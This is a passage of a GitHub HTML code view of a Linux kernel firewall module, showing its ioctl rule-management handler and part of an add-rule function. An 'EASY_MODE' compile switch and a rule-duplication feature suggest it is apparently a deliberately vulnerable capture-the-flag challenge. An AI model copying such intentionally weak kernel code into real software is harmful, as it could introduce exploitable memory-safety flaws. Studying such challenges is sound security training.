          <td id="file-firewall-c-LC118" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_ioctl</span>(<span class="pl-k">struct</span> file *file, <span class="pl-k">unsigned</span> <span class="pl-k">int</span> cmd, <span class="pl-k">unsigned</span> <span class="pl-k">long</span> arg)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L119" class="blob-num js-line-number js-code-nav-line-number" data-line-number="119"></td>
          <td id="file-firewall-c-LC119" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L120" class="blob-num js-line-number js-code-nav-line-number" data-line-number="120"></td>
          <td id="file-firewall-c-LC120" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> ret;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L121" class="blob-num js-line-number js-code-nav-line-number" data-line-number="121"></td>
          <td id="file-firewall-c-LC121" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> user_rule;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L122" class="blob-num js-line-number js-code-nav-line-number" data-line-number="122"></td>
          <td id="file-firewall-c-LC122" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">rule_t</span> **firewall_rules;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L123" class="blob-num js-line-number js-code-nav-line-number" data-line-number="123"></td>
          <td id="file-firewall-c-LC123" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L124" class="blob-num js-line-number js-code-nav-line-number" data-line-number="124"></td>
          <td id="file-firewall-c-LC124" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">mutex_lock</span>(&amp;firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L125" class="blob-num js-line-number js-code-nav-line-number" data-line-number="125"></td>
          <td id="file-firewall-c-LC125" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(&amp;user_rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L126" class="blob-num js-line-number js-code-nav-line-number" data-line-number="126"></td>
          <td id="file-firewall-c-LC126" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L127" class="blob-num js-line-number js-code-nav-line-number" data-line-number="127"></td>
          <td id="file-firewall-c-LC127" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">copy_from_user</span>((<span class="pl-k">void</span> *)&amp;user_rule, (<span class="pl-k">void</span> *)arg, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>)))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L128" class="blob-num js-line-number js-code-nav-line-number" data-line-number="128"></td>
          <td id="file-firewall-c-LC128" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L129" class="blob-num js-line-number js-code-nav-line-number" data-line-number="129"></td>
          <td id="file-firewall-c-LC129" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_ioctl() cannot copy user request!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L130" class="blob-num js-line-number js-code-nav-line-number" data-line-number="130"></td>
          <td id="file-firewall-c-LC130" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">mutex_unlock</span>(&amp;firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L131" class="blob-num js-line-number js-code-nav-line-number" data-line-number="131"></td>
          <td id="file-firewall-c-LC131" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L132" class="blob-num js-line-number js-code-nav-line-number" data-line-number="132"></td>
          <td id="file-firewall-c-LC132" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L133" class="blob-num js-line-number js-code-nav-line-number" data-line-number="133"></td>
          <td id="file-firewall-c-LC133" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L134" class="blob-num js-line-number js-code-nav-line-number" data-line-number="134"></td>
          <td id="file-firewall-c-LC134" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (user_rule.<span class="pl-smi">idx</span> &gt;= MAX_RULES)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L135" class="blob-num js-line-number js-code-nav-line-number" data-line-number="135"></td>
          <td id="file-firewall-c-LC135" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L136" class="blob-num js-line-number js-code-nav-line-number" data-line-number="136"></td>
          <td id="file-firewall-c-LC136" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_ioctl() invalid index!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L137" class="blob-num js-line-number js-code-nav-line-number" data-line-number="137"></td>
          <td id="file-firewall-c-LC137" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">mutex_unlock</span>(&amp;firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L138" class="blob-num js-line-number js-code-nav-line-number" data-line-number="138"></td>
          <td id="file-firewall-c-LC138" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L139" class="blob-num js-line-number js-code-nav-line-number" data-line-number="139"></td>
          <td id="file-firewall-c-LC139" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L140" class="blob-num js-line-number js-code-nav-line-number" data-line-number="140"></td>
          <td id="file-firewall-c-LC140" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L141" class="blob-num js-line-number js-code-nav-line-number" data-line-number="141"></td>
          <td id="file-firewall-c-LC141" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((user_rule.<span class="pl-smi">type</span> != INBOUND) &amp;&amp; (user_rule.<span class="pl-smi">type</span> != OUTBOUND))</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L142" class="blob-num js-line-number js-code-nav-line-number" data-line-number="142"></td>
          <td id="file-firewall-c-LC142" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L143" class="blob-num js-line-number js-code-nav-line-number" data-line-number="143"></td>
          <td id="file-firewall-c-LC143" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_ioctl() invalid rule type!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L144" class="blob-num js-line-number js-code-nav-line-number" data-line-number="144"></td>
          <td id="file-firewall-c-LC144" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">mutex_unlock</span>(&amp;firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L145" class="blob-num js-line-number js-code-nav-line-number" data-line-number="145"></td>
          <td id="file-firewall-c-LC145" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L146" class="blob-num js-line-number js-code-nav-line-number" data-line-number="146"></td>
          <td id="file-firewall-c-LC146" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L147" class="blob-num js-line-number js-code-nav-line-number" data-line-number="147"></td>
          <td id="file-firewall-c-LC147" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L148" class="blob-num js-line-number js-code-nav-line-number" data-line-number="148"></td>
          <td id="file-firewall-c-LC148" class="blob-code blob-code-inner js-file-line">    firewall_rules = (user_rule.<span class="pl-smi">type</span> == INBOUND) ? firewall_rules_in : firewall_rules_out;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L149" class="blob-num js-line-number js-code-nav-line-number" data-line-number="149"></td>
          <td id="file-firewall-c-LC149" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L150" class="blob-num js-line-number js-code-nav-line-number" data-line-number="150"></td>
          <td id="file-firewall-c-LC150" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">switch</span> (cmd)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L151" class="blob-num js-line-number js-code-nav-line-number" data-line-number="151"></td>
          <td id="file-firewall-c-LC151" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L152" class="blob-num js-line-number js-code-nav-line-number" data-line-number="152"></td>
          <td id="file-firewall-c-LC152" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> ADD_RULE:</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L153" class="blob-num js-line-number js-code-nav-line-number" data-line-number="153"></td>
          <td id="file-firewall-c-LC153" class="blob-code blob-code-inner js-file-line">            ret = <span class="pl-c1">firewall_add_rule</span>(user_rule, firewall_rules, user_rule.<span class="pl-smi">idx</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L154" class="blob-num js-line-number js-code-nav-line-number" data-line-number="154"></td>
          <td id="file-firewall-c-LC154" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L155" class="blob-num js-line-number js-code-nav-line-number" data-line-number="155"></td>
          <td id="file-firewall-c-LC155" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L156" class="blob-num js-line-number js-code-nav-line-number" data-line-number="156"></td>
          <td id="file-firewall-c-LC156" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> DELETE_RULE:</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L157" class="blob-num js-line-number js-code-nav-line-number" data-line-number="157"></td>
          <td id="file-firewall-c-LC157" class="blob-code blob-code-inner js-file-line">            ret = <span class="pl-c1">firewall_delete_rule</span>(user_rule, firewall_rules, user_rule.<span class="pl-smi">idx</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L158" class="blob-num js-line-number js-code-nav-line-number" data-line-number="158"></td>
          <td id="file-firewall-c-LC158" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L159" class="blob-num js-line-number js-code-nav-line-number" data-line-number="159"></td>
          <td id="file-firewall-c-LC159" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L160" class="blob-num js-line-number js-code-nav-line-number" data-line-number="160"></td>
          <td id="file-firewall-c-LC160" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> SHOW_RULE:</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L161" class="blob-num js-line-number js-code-nav-line-number" data-line-number="161"></td>
          <td id="file-firewall-c-LC161" class="blob-code blob-code-inner js-file-line">            ret = <span class="pl-c1">firewall_show_rule</span>(user_rule, firewall_rules, user_rule.<span class="pl-smi">idx</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L162" class="blob-num js-line-number js-code-nav-line-number" data-line-number="162"></td>
          <td id="file-firewall-c-LC162" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L163" class="blob-num js-line-number js-code-nav-line-number" data-line-number="163"></td>
          <td id="file-firewall-c-LC163" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L164" class="blob-num js-line-number js-code-nav-line-number" data-line-number="164"></td>
          <td id="file-firewall-c-LC164" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> EDIT_RULE:</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L165" class="blob-num js-line-number js-code-nav-line-number" data-line-number="165"></td>
          <td id="file-firewall-c-LC165" class="blob-code blob-code-inner js-file-line">            ret = <span class="pl-c1">firewall_edit_rule</span>(user_rule, firewall_rules, user_rule.<span class="pl-smi">idx</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L166" class="blob-num js-line-number js-code-nav-line-number" data-line-number="166"></td>
          <td id="file-firewall-c-LC166" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L167" class="blob-num js-line-number js-code-nav-line-number" data-line-number="167"></td>
          <td id="file-firewall-c-LC167" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L168" class="blob-num js-line-number js-code-nav-line-number" data-line-number="168"></td>
          <td id="file-firewall-c-LC168" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> DUP_RULE:</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L169" class="blob-num js-line-number js-code-nav-line-number" data-line-number="169"></td>
          <td id="file-firewall-c-LC169" class="blob-code blob-code-inner js-file-line">            ret = <span class="pl-c1">firewall_dup_rule</span>(user_rule, firewall_rules, user_rule.<span class="pl-smi">idx</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L170" class="blob-num js-line-number js-code-nav-line-number" data-line-number="170"></td>
          <td id="file-firewall-c-LC170" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L171" class="blob-num js-line-number js-code-nav-line-number" data-line-number="171"></td>
          <td id="file-firewall-c-LC171" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L172" class="blob-num js-line-number js-code-nav-line-number" data-line-number="172"></td>
          <td id="file-firewall-c-LC172" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">default</span>:</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L173" class="blob-num js-line-number js-code-nav-line-number" data-line-number="173"></td>
          <td id="file-firewall-c-LC173" class="blob-code blob-code-inner js-file-line">            ret = ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L174" class="blob-num js-line-number js-code-nav-line-number" data-line-number="174"></td>
          <td id="file-firewall-c-LC174" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L175" class="blob-num js-line-number js-code-nav-line-number" data-line-number="175"></td>
          <td id="file-firewall-c-LC175" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L176" class="blob-num js-line-number js-code-nav-line-number" data-line-number="176"></td>
          <td id="file-firewall-c-LC176" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L177" class="blob-num js-line-number js-code-nav-line-number" data-line-number="177"></td>
          <td id="file-firewall-c-LC177" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">mutex_unlock</span>(&amp;firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L178" class="blob-num js-line-number js-code-nav-line-number" data-line-number="178"></td>
          <td id="file-firewall-c-LC178" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L179" class="blob-num js-line-number js-code-nav-line-number" data-line-number="179"></td>
          <td id="file-firewall-c-LC179" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> ret;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L180" class="blob-num js-line-number js-code-nav-line-number" data-line-number="180"></td>
          <td id="file-firewall-c-LC180" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L181" class="blob-num js-line-number js-code-nav-line-number" data-line-number="181"></td>
          <td id="file-firewall-c-LC181" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L182" class="blob-num js-line-number js-code-nav-line-number" data-line-number="182"></td>
          <td id="file-firewall-c-LC182" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L183" class="blob-num js-line-number js-code-nav-line-number" data-line-number="183"></td>
          <td id="file-firewall-c-LC183" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_add_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L184" class="blob-num js-line-number js-code-nav-line-number" data-line-number="184"></td>
          <td id="file-firewall-c-LC184" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L185" class="blob-num js-line-number js-code-nav-line-number" data-line-number="185"></td>
          <td id="file-firewall-c-LC185" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_add_rule() adding new rule!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L186" class="blob-num js-line-number js-code-nav-line-number" data-line-number="186"></td>
          <td id="file-firewall-c-LC186" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L187" class="blob-num js-line-number js-code-nav-line-number" data-line-number="187"></td>
          <td id="file-firewall-c-LC187" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (firewall_rules[idx] != <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L188" class="blob-num js-line-number js-code-nav-line-number" data-line-number="188"></td>
          <td id="file-firewall-c-LC188" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L189" class="blob-num js-line-number js-code-nav-line-number" data-line-number="189"></td>
          <td id="file-firewall-c-LC189" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_add_rule() invalid rule slot!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L190" class="blob-num js-line-number js-code-nav-line-number" data-line-number="190"></td>
          <td id="file-firewall-c-LC190" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L191" class="blob-num js-line-number js-code-nav-line-number" data-line-number="191"></td>
          <td id="file-firewall-c-LC191" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L192" class="blob-num js-line-number js-code-nav-line-number" data-line-number="192"></td>
          <td id="file-firewall-c-LC192" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L193" class="blob-num js-line-number js-code-nav-line-number" data-line-number="193"></td>
          <td id="file-firewall-c-LC193" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx] = (<span class="pl-c1">rule_t</span> *)<span class="pl-c1">kzalloc</span>(<span class="pl-k">sizeof</span>(<span class="pl-c1">rule_t</span>), GFP_KERNEL);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L194" class="blob-num js-line-number js-code-nav-line-number" data-line-number="194"></td>
          <td id="file-firewall-c-LC194" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L195" class="blob-num js-line-number js-code-nav-line-number" data-line-number="195"></td>
          <td id="file-firewall-c-LC195" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (!firewall_rules[idx])</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L196" class="blob-num js-line-number js-code-nav-line-number" data-line-number="196"></td>
          <td id="file-firewall-c-LC196" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L197" class="blob-num js-line-number js-code-nav-line-number" data-line-number="197"></td>
          <td id="file-firewall-c-LC197" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_add_rule() allocation error!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L198" class="blob-num js-line-number js-code-nav-line-number" data-line-number="198"></td>
          <td id="file-firewall-c-LC198" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L199" class="blob-num js-line-number js-code-nav-line-number" data-line-number="199"></td>
          <td id="file-firewall-c-LC199" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L200" class="blob-num js-line-number js-code-nav-line-number" data-line-number="200"></td>
          <td id="file-firewall-c-LC200" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L201" class="blob-num js-line-number js-code-nav-line-number" data-line-number="201"></td>
          <td id="file-firewall-c-LC201" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(firewall_rules[idx]-&gt;<span class="pl-smi">iface</span>, user_rule.<span class="pl-smi">iface</span>, <span class="pl-c1">16</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L202" class="blob-num js-line-number js-code-nav-line-number" data-line-number="202"></td>
          <td id="file-firewall-c-LC202" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(firewall_rules[idx]-&gt;<span class="pl-smi">name</span>, user_rule.<span class="pl-smi">name</span>, <span class="pl-c1">16</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L203" class="blob-num js-line-number js-code-nav-line-number" data-line-number="203"></td>
          <td id="file-firewall-c-LC203" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L204" class="blob-num js-line-number js-code-nav-line-number" data-line-number="204"></td>
          <td id="file-firewall-c-LC204" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">ifdef</span> EASY_MODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L205" class="blob-num js-line-number js-code-nav-line-number" data-line-number="205"></td>
          <td id="file-firewall-c-LC205" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">strncpy</span>(firewall_rules[idx]-&gt;<span class="pl-smi">desc</span>, user_rule.<span class="pl-smi">desc</span>, DESC_MAX);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L206" class="blob-num js-line-number js-code-nav-line-number" data-line-number="206"></td>
          <td id="file-firewall-c-LC206" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L207" class="blob-num js-line-number js-code-nav-line-number" data-line-number="207"></td>
          <td id="file-firewall-c-LC207" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L208" class="blob-num js-line-number js-code-nav-line-number" data-line-number="208"></td>
          <td id="file-firewall-c-LC208" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">in4_pton</span>(user_rule.<span class="pl-smi">ip</span>, <span class="pl-c1">strnlen</span>(user_rule.<span class="pl-smi">ip</span>, <span class="pl-c1">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;<span class="pl-smi">ip</span>), -<span class="pl-c1">1</span>, <span class="pl-c1">NULL</span>) == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L209" class="blob-num js-line-number js-code-nav-line-number" data-line-number="209"></td>
          <td id="file-firewall-c-LC209" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L210" class="blob-num js-line-number js-code-nav-line-number" data-line-number="210"></td>
          <td id="file-firewall-c-LC210" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_ERR <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_add_rule() invalid IP format!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L211" class="blob-num js-line-number js-code-nav-line-number" data-line-number="211"></td>
          <td id="file-firewall-c-LC211" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">kfree</span>(firewall_rules[idx]);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L212" class="blob-num js-line-number js-code-nav-line-number" data-line-number="212"></td>
          <td id="file-firewall-c-LC212" class="blob-code blob-code-inner js-file-line">        firewall_rules[idx] = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L213" class="blob-num js-line-number js-code-nav-line-number" data-line-number="213"></td>
          <td id="file-firewall-c-LC213" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L214" class="blob-num js-line-number js-code-nav-line-number" data-line-number="214"></td>
          <td id="file-firewall-c-LC214" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L215" class="blob-num js-line-number js-code-nav-line-number" data-line-number="215"></td>
          <td id="file-firewall-c-LC215" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L216" class="blob-num js-line-number js-code-nav-line-number" data-line-number="216"></td>
          <td id="file-firewall-c-LC216" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">in4_pton</span>(user_rule.<span class="pl-smi">netmask</span>, <span class="pl-c1">strnlen</span>(user_rule.<span class="pl-smi">netmask</span>, <span class="pl-c1">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;<span class="pl-smi">netmask</span>), -<span class="pl-c1">1</span>, <span class="pl-c1">NULL</span>) == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L217" class="blob-num js-line-number js-code-nav-line-number" data-line-number="217"></td>
          <td id="file-firewall-c-LC217" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L218" class="blob-num js-line-number js-code-nav-line-number" data-line-number="218"></td>
          <td id="file-firewall-c-LC218" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_ERR <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_add_rule() invalid Netmask format!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L219" class="blob-num js-line-number js-code-nav-line-number" data-line-number="219"></td>
          <td id="file-firewall-c-LC219" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">kfree</span>(firewall_rules[idx]);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L220" class="blob-num js-line-number js-code-nav-line-number" data-line-number="220"></td>
          <td id="file-firewall-c-LC220" class="blob-code blob-code-inner js-file-line">        firewall_rules[idx] = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L221" class="blob-num js-line-number js-code-nav-line-number" data-line-number="221"></td>
          <td id="file-firewall-c-LC221" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L222" class="blob-num js-line-number js-code-nav-line-number" data-line-number="222"></td>
          <td id="file-firewall-c-LC222" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L223" class="blob-num js-line-number js-code-nav-line-number" data-line-number="223"></td>
          <td id="file-firewall-c-LC223" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L224" class="blob-num js-line-number js-code-nav-line-number" data-line-number="224"></td>
          <td id="file-firewall-c-LC224" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx]-&gt;<span class="pl-smi">proto</span> = user_rule.<span class="pl-smi">proto</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L225" class="blob-num js-line-number js-code-nav-line-number" data-line-number="225"></td>
          <td id="file-firewall-c-LC225" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx]-&gt;<span class="pl-smi">port</span> = <span class="pl-c1">ntohs</span>(user_rule.<span class="pl-smi">port</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L226" class="blob-num js-line-number js-code-nav-line-number" data-line-number="226"></td>
          <td id="file-firewall-c-LC226" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx]-&gt;<span class="pl-smi">action</span> = user_rule.<span class="pl-smi">action</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L227" class="blob-num js-line-number js-code-nav-line-number" data-line-number="227"></td>
          <td id="file-firewall-c-LC227" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx]-&gt;<span class="pl-smi">is_duplicated</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L228" class="blob-num js-line-number js-code-nav-line-number" data-line-number="228"></td>
          <td id="file-firewall-c-LC228" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L229" class="blob-num js-line-number js-code-nav-line-number" data-line-number="229"></td>
